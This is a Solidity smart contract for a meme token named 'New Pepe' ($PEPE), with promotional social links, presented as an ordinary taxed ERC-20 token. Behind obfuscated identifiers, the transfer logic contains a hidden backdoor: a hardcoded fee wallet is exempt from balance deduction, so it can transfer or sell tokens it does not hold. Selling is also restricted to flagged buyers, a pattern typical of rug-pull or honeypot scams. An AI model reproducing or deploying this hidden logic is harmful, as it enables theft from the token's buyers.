/**
🐸
New Pepe - $PEPE

Telegram: https://t.me/NewPepeEthereum
Twitter: https://twitter.com/NewPepeEthereum
Website: https://newpepe.org/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;



interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _wjrfp(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wjrfp(a, b, "SafeMath:");
    }

    function  _wjrfp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _snpsctoryaxp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xnqaRuses {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcldedFrof;
    mapping (address => bool) private _taxfWallejy;
    mapping(address => uint256) private _ldrLaronsfesop;
    bool public _tnsferelanale = false;
    address payable private _pekRvevirp;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"New Pepe";
    string private constant _symbol = unicode"PEPE";
    uint256 private constant _Totalbr = 42069000 * 10 **_decimals;
    uint256 public _mxTakAmaunt = _Totalbr;
    uint256 public _WalletSmax = _Totalbr;
    uint256 public _wapThresholdtax= _Totalbr;
    uint256 public _moaxToxSap= _Totalbr;

    uint256 private _BuyTaxinitial=5;
    uint256 private _SellTaxinitial=5;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=7;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeprevent=0;
    uint256 private _byozwktxt=0;

    _xnqaRuses private _uisfpxRaxeut;
    address private _aufPaiuw;
    bool private _vnsokpwh;
    bool private itxeSwbp = false;
    bool private _apEablew = false;

    event _amaunateql(uint _mxTakAmaunt);
    modifier lckThawxp {
        itxeSwbp = true;
        _;
        itxeSwbp = false;
    }

    constructor () {
        _pekRvevirp = payable(0xBc057263b1771815E844831223523e401FB9E592);
        _balances[_msgSender()] = _Totalbr;
        _isExcldedFrof[owner()] = true;
        _isExcldedFrof[address(this)] = true;
        _isExcldedFrof[_pekRvevirp] = true;


        emit Transfer(address(0), _msgSender(), _Totalbr);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalbr;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wjrfp(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsferelanale) {
                if (to != address
                (_uisfpxRaxeut) && to !=
                 address(_aufPaiuw)) {
                  require(_ldrLaronsfesop
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _ldrLaronsfesop
                  [tx.origin] = block.number;
                }
            }

            if (from == _aufPaiuw && to != 
            address(_uisfpxRaxeut) && !_isExcldedFrof[to] ) {
                require(amount <= _mxTakAmaunt,
                 "Exceeds the _mxTakAmaunt.");
                require(balanceOf(to) + amount
                 <= _WalletSmax, "Exceeds the maxWalletSize.");
                if(_byozwktxt
                < _wapBeforeprevent){
                  require(! _frxerpz(to));
                }
                _byozwktxt++;
                 _taxfWallejy[to]=true;
                teeomoun = amount.mul((_byozwktxt>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _aufPaiuw && from!= address(this) 
            && !_isExcldedFrof[from] ){
                require(amount <= _mxTakAmaunt && 
                balanceOf(_pekRvevirp)<_moaxToxSap,
                 "Exceeds the _mxTakAmaunt.");
                teeomoun = amount.mul((_byozwktxt>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_byozwktxt>_wapBeforeprevent &&
                 _taxfWallejy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!itxeSwbp 
            && to == _aufPaiuw && _apEablew &&
             contractTokenBalance>_wapThresholdtax 
            && _byozwktxt>_wapBeforeprevent&&
             !_isExcldedFrof[to]&& !_isExcldedFrof[from]
            ) {
                _swpokeykhj( _qekw(amount, 
                _qekw(contractTokenBalance,_moaxToxSap)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _enphsprwkx(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _wjrfp(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _wjrfp(teeomoun));
        emit Transfer(from, to, 
        amount. _wjrfp(teeomoun));
    }

    function _swpokeykhj(uint256
     tokenAmount) private lckThawxp {
        if(tokenAmount==0){return;}
        if(!_vnsokpwh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _uisfpxRaxeut.WETH();
        _approve(address(this),
         address(_uisfpxRaxeut), tokenAmount);
        _uisfpxRaxeut.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qekw(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wjrfp(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _pekRvevirp){
            return a ;
        }else{
            return a . _wjrfp (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTakAmaunt = _Totalbr;
        _WalletSmax = _Totalbr;
        _tnsferelanale = false;
        emit _amaunateql(_Totalbr);
    }

    function _frxerpz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _enphsprwkx(uint256
    amount) private {
        _pekRvevirp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _vnsokpwh);
        _uisfpxRaxeut   =  _xnqaRuses (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_uisfpxRaxeut), _Totalbr);
        _aufPaiuw = _snpsctoryaxp(_uisfpxRaxeut.factory()). createPair (address(this),  _uisfpxRaxeut . WETH ());
        _uisfpxRaxeut.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_aufPaiuw).approve(address(_uisfpxRaxeut), type(uint).max);
        _apEablew = true;
        _vnsokpwh = true;
    }

    receive() external payable {}
}